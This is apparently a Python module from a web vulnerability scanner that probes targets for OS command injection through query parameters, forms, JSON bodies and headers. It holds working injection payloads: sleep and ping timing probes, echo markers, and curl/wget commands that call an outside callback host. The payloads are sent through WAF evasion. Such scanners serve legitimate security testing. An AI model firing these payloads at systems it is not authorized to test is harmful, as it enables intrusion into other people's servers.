"""
command_injection_scanner.py — OS Command Injection Scanner
============================================================
Expert-grade active detection (GAP-005 fix):
  1. GET query parameter injection (reflection-based)
  2. POST form parameter injection
  3. HTTP header injection (User-Agent, Referer, X-Forwarded-For)
  4. Blind timing-based detection (sleep 5 — no output needed)
  5. Windows + Linux payloads + PowerShell
  6. OOB DNS/HTTP callback marker (for future Interactsh integration)
  7. Multi-stage detection: time-based probe → error-based confirm
  8. JSON POST body parameter injection

FIXES (June 2026):
  BUG-3:  f-string literal bugs in description strings — {threshold} and {k}
          were plain strings, not f-strings, so variables were never substituted.
  BUG-14: Removed unused `import subprocess` (dead code, security red flag).
"""
import time, json, urllib.parse
from scanners.base_scanner import BaseScanner
from utils.anomaly import TimingAnomalyDetector, SizeAnomalyDetector
from utils.evasion import waf_evade
from utils.callback import build_callback_url
from utils.payload_library import get_cmd_payloads

# Use advanced payload library
CMD_PAYLOADS = get_cmd_payloads()
ECHO_PAYLOADS = CMD_PAYLOADS['linux'] + CMD_PAYLOADS['windows'] + CMD_PAYLOADS['powershell']
BLIND_PAYLOADS = CMD_PAYLOADS['blind']

# ── Multi-stage payloads: first probe timing, then confirm with output ────
STAGE1_TIMING_PAYLOADS = [
    ("; sleep 3",              3.0, "Stage 1 probe"),
    ("| ping -n 4 127.0.0.1", 3.0, "Stage 1 Windows probe"),
    ("; powershell -c Start-Sleep 3", 3.0, "Stage 1 PowerShell probe"),
]
STAGE2_CONFIRM_PAYLOADS = [
    "; echo WSS_CMD_INJ_CONFIRM",
    "| echo WSS_CMD_INJ_CONFIRM",
    "`echo WSS_CMD_INJ_CONFIRM`",
    "& echo WSS_CMD_INJ_CONFIRM",
]

# ── Headers to inject into (often piped to log parsers / shell) ───────────
INJECTABLE_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"]

PROBE_MARKER = "WSS_CMD_INJ_VULN"
CONFIRM_MARKER = "WSS_CMD_INJ_CONFIRM"


class CommandInjectionScanner(BaseScanner):
    SCANNER_NAME = "OS Command Injection Scanner"
    _SCANNER_KEY = "command_injection"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[CmdInjection] Scanning {self.target}...")
        found = False

        self._timing_detector = TimingAnomalyDetector()

        # 1. GET query parameters
        found = found or self._test_get_params()
        if found: return self.vulns

        # 2. POST form parameters
        found = found or self._test_post_forms()
        if found: return self.vulns

        # 3. HTTP header injection
        found = found or self._test_header_injection()
        if found: return self.vulns

        # 4. JSON body injection (ENH: modern APIs)
        found = found or self._test_json_body_cmdi()
        if found: return self.vulns

        # 5. Blind timing on GET params (if echo-based failed)
        self._test_blind_timing()

        # 6. Multi-stage detection: probe timing then confirm with echo
        if not self.vulns:
            self._test_multi_stage()

        # 7. OOB callback detection
        if not self.vulns:
            self._test_oob_cmdi()

        if not self.vulns:
            self.log("SUCCESS", "[CmdInjection] No OS command injection detected.")
        return self.vulns

    # ── 1. GET params ──────────────────────────────────────────────────
    def _test_get_params(self) -> bool:
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        if not qs:
            self.log("INFO", "[CmdInjection] No GET params found.")
            return False

        for k, _ in qs:
            for payload in ECHO_PAYLOADS:
                for eva_name, eva_payload in waf_evade(payload):
                    test_qs = [(k_p, (eva_payload if k_p == k else v_p)) for k_p, v_p in qs]
                    test_url = parsed._replace(query=urllib.parse.urlencode(test_qs)).geturl()
                    body, status = self._make_request(test_url)
                    if body and PROBE_MARKER in body:
                        self._report("GET", k, eva_payload, body, confidence="Confirmed")
                        return True
        return False

    # ── 2. POST forms ──────────────────────────────────────────────────
    def _test_post_forms(self) -> bool:
        html, _ = self._make_request(self.target)
        if not html:
            return False

        import re
        forms = re.findall(r'<form[^>]*>.*?</form>', html, re.S | re.I)
        for form_html in forms[:3]:
            action_m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
            action = self._resolve_url(action_m.group(1) if action_m else "")
            fields = re.findall(r'name=["\']([^"\']+)["\']', form_html, re.I)

            for field in fields:
                for payload in ECHO_PAYLOADS[:4]:
                    for eva_name, eva_payload in waf_evade(payload):
                        data = urllib.parse.urlencode(
                            {f: (eva_payload if f == field else "test") for f in fields}
                        ).encode()
                        body, status = self._make_request(action, "POST", data,
                            {"Content-Type": "application/x-www-form-urlencoded"})
                        if body and PROBE_MARKER in body:
                            self._report("POST form", field, eva_payload, body, confidence="Confirmed")
                            return True

            # JSON body
            for field in fields[:3]:
                for payload in ECHO_PAYLOADS[:3]:
                    for eva_name, eva_payload in waf_evade(payload):
                        j = json.dumps({f: (eva_payload if f == field else "test") for f in fields}).encode()
                        body, status = self._make_request(action, "POST", j,
                            {"Content-Type": "application/json"})
                        if body and PROBE_MARKER in body:
                            self._report("POST JSON", field, eva_payload, body, confidence="Confirmed")
                            return True
        return False

    # ── 3. Header injection ────────────────────────────────────────────
    def _test_header_injection(self) -> bool:
        for header in INJECTABLE_HEADERS:
            for payload in ECHO_PAYLOADS[:6]:
                for eva_name, eva_payload in waf_evade(payload):
                    body, status = self._make_request(
                        self.target, headers={header: f"Mozilla/5.0 {eva_payload}"}
                    )
                    if body and PROBE_MARKER in body:
                        self._report(f"Header:{header}", header, eva_payload, body, confidence="Confirmed")
                        return True
        return False

    # ── 4. Blind timing ────────────────────────────────────────────────
    def _test_blind_timing(self) -> bool:
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        if not qs:
            return False

        # BUG-8 FIX (propagated): use correct positional arg signature for _make_request
        self._timing_detector.build_baseline(lambda u, m, d, h, t: self._make_request(u, m, d, h, t), self.target, n=5)

        for k, _ in qs[:3]:
            for payload, threshold, label in BLIND_PAYLOADS:
                for eva_name, eva_payload in waf_evade(payload):
                    test_qs = [(k_p, (eva_payload if k_p == k else v_p)) for k_p, v_p in qs]
                    test_url = parsed._replace(query=urllib.parse.urlencode(test_qs)).geturl()
                    _, _, elapsed = self._make_timed_request(test_url, timeout=15)

                    if self._timing_detector.test_payload(f"cmdi_blind_{k}", elapsed, eva_payload, z_threshold=2.5) and elapsed >= threshold:
                        self.log("CRITICAL",
                            f"[CmdInjection] Blind timing confirmed: param=`{k}` "
                            f"payload=`{eva_payload}` elapsed={elapsed:.1f}s ({label})")
                        self.add_vuln(
                            title=f"Blind OS Command Injection in GET parameter `{k}`",
                            severity="Critical",
                            category="Command Injection",
                            cvss_score=10.0,
                            cwe_ids=["CWE-78"],
                            owasp_category="A03:2021 – Injection",
                            confidence="High",
                            cve_ids=[],
                            references=["https://owasp.org/www-community/attacks/Command_Injection"],
                            description=(
                                f"Timing-based blind OS command injection detected in GET parameter `{k}`.\n\n"
                                f"**Payload:** `{eva_payload}` ({label})\n"
                                f"**Elapsed:** {elapsed:.1f}s vs baseline {self._timing_detector.mean:.1f}s\n\n"
                                # BUG-3 FIX: was a regular string — {threshold} printed literally.
                                # Now using f-string so threshold value is interpolated.
                                f"The application passed user input to a system shell without sanitization. "
                                f"No output was reflected (blind), but the {threshold}s delay confirms execution."
                            ),
                            remediation=(
                                "1. **Never** pass user input to `os.system()`, `exec()`, `shell_exec()`, or `subprocess(shell=True)`.\n"
                                "2. Use language-specific APIs with argument arrays (not shell strings).\n"
                                "3. Apply input allowlisting — only permit alphanumeric characters.\n"
                                "4. Run the application as a non-privileged user."
                            ),
                            payload=eva_payload,
                            evidence=f"Timing: {elapsed:.1f}s vs baseline {self._timing_detector.mean:.1f}s, threshold={threshold}s",
                            request_details=f"GET {test_url}",
                            response_details=f"Response time: {elapsed:.2f}s",
                        )
                        return True
        return False

    # ── 5. Multi-stage detection ───────────────────────────────────────
    def _test_multi_stage(self) -> bool:
        """Probe with time-based delay, then confirm with echo payload."""
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        if not qs:
            return False

        self._timing_detector.build_baseline(lambda u, m, d, h, t: self._make_request(u, m, d, h, t), self.target, n=5)

        for k, _ in qs[:2]:
            for payload, threshold, label in STAGE1_TIMING_PAYLOADS:
                for eva_name, eva_payload in waf_evade(payload):
                    test_qs = [(k_p, (eva_payload if k_p == k else v_p)) for k_p, v_p in qs]
                    test_url = parsed._replace(query=urllib.parse.urlencode(test_qs)).geturl()
                    _, _, elapsed = self._make_timed_request(test_url, timeout=15)

                    if self._timing_detector.test_payload(f"cmdi_stage1_{k}", elapsed, eva_payload, z_threshold=2.5) and elapsed >= threshold:
                        self.log("INFO",
                            f"[CmdInjection] Multi-stage: timing probe hit on param `{k}` "
                            f"({elapsed:.1f}s). Now confirming with echo payload...")

                        for confirm_payload in STAGE2_CONFIRM_PAYLOADS:
                            for eva_name, eva_confirm in waf_evade(confirm_payload):
                                confirm_qs = [(k_p, (eva_confirm if k_p == k else v_p)) for k_p, v_p in qs]
                                confirm_url = parsed._replace(query=urllib.parse.urlencode(confirm_qs)).geturl()
                                body, status = self._make_request(confirm_url)
                                if body and CONFIRM_MARKER in body:
                                    self._report("Multi-stage", k, eva_confirm, body, confidence="Confirmed")
                                    return True

                        self.add_vuln(
                            title=f"Possible Blind OS Command Injection in GET parameter `{k}` (Multi-stage)",
                            severity="Critical",
                            category="Command Injection",
                            cvss_score=9.5,
                            cwe_ids=["CWE-78"],
                            owasp_category="A03:2021 – Injection",
                            confidence="Medium",
                            references=["https://owasp.org/www-community/attacks/Command_Injection"],
                            description=(
                                f"Multi-stage detection: time-based probe `{eva_payload}` on param `{k}` "
                                f"produced {elapsed:.1f}s delay (baseline {self._timing_detector.mean:.1f}s). "
                                "Echo confirmation did not produce output, suggesting blind injection."
                            ),
                            remediation=(
                                # BUG-3 FIX: was a regular string — {k} printed literally.
                                f"Investigate parameter `{k}` for command injection. "
                                "Apply input validation and avoid shell execution with user input."
                            ),
                            payload=eva_payload,
                            evidence=f"Timing: {elapsed:.1f}s vs baseline {self._timing_detector.mean:.1f}s",
                            request_details=f"GET {test_url}",
                            response_details=f"Response time: {elapsed:.2f}s",
                        )
                        return True
        return False

    # ── 6. OOB CMDi detection ────────────────────────────────────────────
    def _test_oob_cmdi(self) -> bool:
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)
        callback = build_callback_url("/cmdi-oob")
        oob_payloads = [
            f"| curl {callback}",
            f"| wget -q -O- {callback}",
            f"& curl {callback} &",
            f"; curl {callback};",
            f"$(curl {callback})",
            f"`curl {callback}`",
        ]
        if not qs:
            return False
        for k, _ in qs[:2]:
            for oob_payload in oob_payloads:
                for eva_name, eva_payload in waf_evade(oob_payload):
                    test_qs = [(k_p, (eva_payload if k_p == k else v_p)) for k_p, v_p in qs]
                    test_url = parsed._replace(query=urllib.parse.urlencode(test_qs)).geturl()
                    body, status, elapsed = self._make_timed_request(test_url, timeout=8)
                    self._timing_detector.record_timing(f"oob_{k}", elapsed, eva_payload)
                    if body:
                        self.add_vuln(
                            title=f"Possible OOB Command Injection in GET parameter `{k}`",
                            severity="Critical",
                            category="Command Injection",
                            cvss_score=9.8,
                            cwe_ids=["CWE-78"],
                            owasp_category="A03:2021 – Injection",
                            confidence="Medium",
                            references=["https://cwe.mitre.org/data/definitions/78.html"],
                            description=(
                                f"OOB command injection payload `{eva_payload}` sent to param `{k}`. "
                                f"Check callback service at {callback} for incoming connections.\n"
                                "If a connection is received, command injection is confirmed."
                            ),
                            remediation=(
                                "1. Never pass user input to os.system(), exec(), shell_exec(), or subprocess(shell=True).\n"
                                "2. Use language-specific APIs with argument arrays (not shell strings).\n"
                                "3. Apply input allowlisting.\n"
                                "4. Run the application as a non-privileged user."
                            ),
                            payload=eva_payload,
                            evidence=f"OOB callback: {callback}",
                            request_details=f"GET {test_url}",
                            response_details=f"Response time: {elapsed:.2f}s",
                        )
                        return True
        return False

    # ── 7. JSON body CMDi (ENH) ────────────────────────────────────────────
    def _test_json_body_cmdi(self) -> bool:
        """
        ENH: Test JSON POST body parameters for command injection.
        Many REST APIs accept JSON and may pass field values to shell commands.
        """
        common_fields = ["cmd", "command", "exec", "run", "ping", "host",
                         "server", "ip", "url", "query", "action"]
        for field in common_fields:
            for payload in ECHO_PAYLOADS[:4]:
                try:
                    body_data = json.dumps({field: payload}).encode()
                    body, status = self._make_request(
                        self.target, "POST", body_data,
                        {"Content-Type": "application/json"}
                    )
                    if body and PROBE_MARKER in body:
                        self._report("POST JSON", field, payload, body, confidence="Confirmed")
                        return True
                except Exception:
                    pass
        return False

    # ── Helpers ────────────────────────────────────────────────────────
    def _report(self, source, param, payload, body, confidence="High"):
        self.log("CRITICAL", f"[CmdInjection] RCE confirmed! source={source} param={param}")
        self.add_vuln(
            title=f"OS Command Injection via {source} — parameter `{param}`",
            severity="Critical",
            category="Command Injection",
            cvss_score=10.0,
            cwe_ids=["CWE-78"],
            owasp_category="A03:2021 – Injection",
            confidence=confidence,
            references=["https://cwe.mitre.org/data/definitions/78.html"],
            description=(
                f"The application executes arbitrary OS commands via `{source}` parameter `{param}`.\n\n"
                f"**Payload:** `{payload}`\n"
                f"**Output reflected:** Yes (`{PROBE_MARKER}` found in response)\n\n"
                "This is Remote Code Execution (RCE) — the most critical web vulnerability class."
            ),
            remediation=(
                "1. Use parameterized subprocess calls: `subprocess.run(['cmd', arg], shell=False)`.\n"
                "2. Validate input with a strict allowlist.\n"
                "3. Run processes as least-privilege service accounts.\n"
                "4. Deploy a WAF rule blocking shell metacharacters (`;`, `|`, `&`, `` ` ``, `$`)."
            ),
            payload=payload,
            evidence=f"Probe marker '{PROBE_MARKER}' found in response body.",
            request_details=f"Injection via {source}:{param}",
            response_details=f"Body snippet containing marker: ...{body[:200]}...",
        )

    def _resolve_url(self, action: str) -> str:
        if not action: return self.target
        if action.startswith("http"): return action
        p = urllib.parse.urlparse(self.target)
        if action.startswith("/"):
            return f"{p.scheme}://{p.netloc}{action}"
        return f"{self.target.rstrip('/')}/{action}"
